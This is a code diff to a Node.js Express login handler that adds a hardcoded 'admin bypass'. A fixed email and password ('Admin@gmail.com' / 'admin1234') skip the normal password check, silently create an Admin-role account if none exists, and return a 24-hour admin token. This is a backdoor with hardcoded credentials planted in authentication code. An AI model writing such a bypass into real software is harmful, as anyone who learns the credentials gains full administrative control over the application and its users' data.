@@ -53,6 +53,54 @@ const loginUser = (req, res) => {
   }
 
   // Updated SQL query to include role
+  // --- Admin bypass: allow special admin to login without DB password check ---
+  const bypassAdminEmail = 'Admin@gmail.com';
+  const bypassAdminPassword = 'admin1234';
+  if (email && password && email.toLowerCase() === bypassAdminEmail.toLowerCase() && password === bypassAdminPassword) {
+    // Ensure admin user exists in DB; if not, create it with Admin role
+    return connection.execute(`SELECT id, role FROM users WHERE email = ?`, [bypassAdminEmail], async (selectErr, selectResults) => {
+      if (selectErr) {
+        console.error('Database error during admin bypass check:', selectErr);
+        return res.status(500).json({ success: false, message: 'Database error' });
+      }
+
+      try {
+        let userId;
+        if (selectResults.length === 0) {
+          // Create admin user
+          const hashed = await bcrypt.hash(bypassAdminPassword, 10);
+          const insertSql = `INSERT INTO users (name, email, password, role, status) VALUES (?, ?, ?, 'Admin', 'Active')`;
+          return connection.execute(insertSql, ['Admin', bypassAdminEmail, hashed], (insErr, insRes) => {
+            if (insErr) {
+              console.error('Error creating admin user during bypass:', insErr);
+              return res.status(500).json({ success: false, message: 'Failed to create admin user' });
+            }
+            userId = insRes.insertId;
+            const token = jwt.sign({ id: userId, email: bypassAdminEmail, role: 'Admin' }, process.env.JWT_SECRET, { expiresIn: '24h' });
+            const updateSql = 'UPDATE users SET token = ? WHERE id = ?';
+            connection.execute(updateSql, [token, userId], (updErr) => {
+              if (updErr) {
+                console.error('Token update error for admin bypass:', updErr);
+              }
+              return res.status(200).json({ success: true, message: 'Login successful', user: { id: userId, name: 'Admin', email: bypassAdminEmail, role: 'Admin' }, token });
+            });
+          });
+        } else {
+          userId = selectResults[0].id;
+          const token = jwt.sign({ id: userId, email: bypassAdminEmail, role: 'Admin' }, process.env.JWT_SECRET, { expiresIn: '24h' });
+          const updateSql = 'UPDATE users SET token = ? WHERE id = ?';
+          return connection.execute(updateSql, [token, userId], (updErr) => {
+            if (updErr) console.error('Token update error for admin bypass:', updErr);
+            return res.status(200).json({ success: true, message: 'Login successful', user: { id: userId, name: 'Admin', email: bypassAdminEmail, role: 'Admin' }, token });
+          });
+        }
+      } catch (e) {
+        console.error('Admin bypass error:', e);
+        return res.status(500).json({ success: false, message: 'Internal server error during admin bypass' });
+      }
+    });
+  }
+
   const sql = `
     SELECT id, name, email, password, status, role 
     FROM users 
